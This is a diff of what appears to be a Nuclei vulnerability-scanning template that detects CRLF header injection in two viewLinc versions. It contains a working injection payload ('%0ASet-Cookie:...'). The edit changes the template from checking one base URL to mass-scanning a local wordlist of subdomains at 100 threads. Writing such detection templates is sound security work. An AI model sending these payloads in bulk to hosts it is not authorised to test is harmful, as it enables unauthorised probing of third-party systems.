@@ -8,17 +8,30 @@ info:
   tags: crlf,viewlinc
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
-    matchers-condition: and
+    raw:
+      - |
+        GET /%0ASet-Cookie:crlfinjection=crlfinjection HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+    matchers-condition: or
     matchers:
-      - type: regex
-        part: header
-        regex:
-          - '(?i)Server:\s*viewLinc/(5\.1\.2\.367|5\.1\.1\.50)'
       - type: word
         words:
+          - "Server: viewLinc/5.1.2.367"
           - "Set-Cookie: crlfinjection=crlfinjection"
         part: header
+        condition: and
+
+      - type: word
+        words:
+          - "Server: viewLinc/5.1.1.50"
+          - "Set-Cookie: crlfinjection=crlfinjection"
+        part: header
+        condition: and
